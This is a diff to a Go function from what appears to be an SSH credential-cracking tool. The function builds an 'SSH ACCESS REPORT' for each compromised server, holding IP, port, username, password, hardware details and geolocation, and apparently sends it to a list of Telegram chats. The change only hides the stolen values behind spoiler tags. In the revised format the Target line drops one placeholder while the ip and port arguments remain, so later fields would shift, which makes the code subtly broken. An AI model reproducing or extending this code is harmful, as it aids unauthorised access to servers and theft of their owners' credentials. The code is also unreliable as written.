@@ -469,11 +469,9 @@ func sendSuccessBatch(batch []Success) {
 
 		msg := fmt.Sprintf(`<b>Made By TreTrauNetwork</b>
 
-🔐 <b>SSH ACCESS REPORT</b>
-
-🎯 <b>Target:</b> <code>%s:%s</code>
-👤 <b>User:</b> <code>%s</code>
-🔑 <b>Pass:</b> <code>%s</code>
+🎯 <b>Target:</b> <span class="tg-spoiler">%s</span>
+👤 <b>User:</b>   <span class="tg-spoiler"><code>%s</code></span>
+🔑 <b>Pass:</b>   <span class="tg-spoiler">%s</span>
 
 🖥️ <b>Host:</b> %s
 🧩 <b>OS:</b> %s
@@ -484,16 +482,16 @@ func sendSuccessBatch(batch []Success) {
 🏗️ <b>Arch:</b> %s
 💾 <b>Chip:</b> %s
 
-🌍 <b>Country:</b> %s
-📍 <b>Region:</b> %s
-🏙️ <b>City:</b> %s
-🏢 <b>Org:</b> %s
+🌍 <b>Country:</b> <span class="tg-spoiler">%s</span>
+📍 <b>Region:</b> <span class="tg-spoiler">%s</span>
+🏙️ <b>City:</b> <span class="tg-spoiler">%s</span>
+🏢 <b>Org:</b> <span class="tg-spoiler">%s</span>
 🪤 <b>Honeypot:</b> %d
 ⏰ <b>Timestamp:</b> %s`,
-			ip, port, user, pass,
-			host, osInfo, sshVer, s.Info.ResponseTime, ports, cpuCores, arch, cpuModel,
-			country, region, city, org, s.Info.HoneypotScore,
-			time.Now().Format("2006-01-02 15:04:05"))
+		ip, port, user, pass,
+		host, osInfo, sshVer, s.Info.ResponseTime, ports, cpuCores, arch, cpuModel,
+		country, region, city, org, s.Info.HoneypotScore,
+		time.Now().Format("2006-01-02 15:04:05"))
 
 		for _, id := range chatIDs {
 			for {
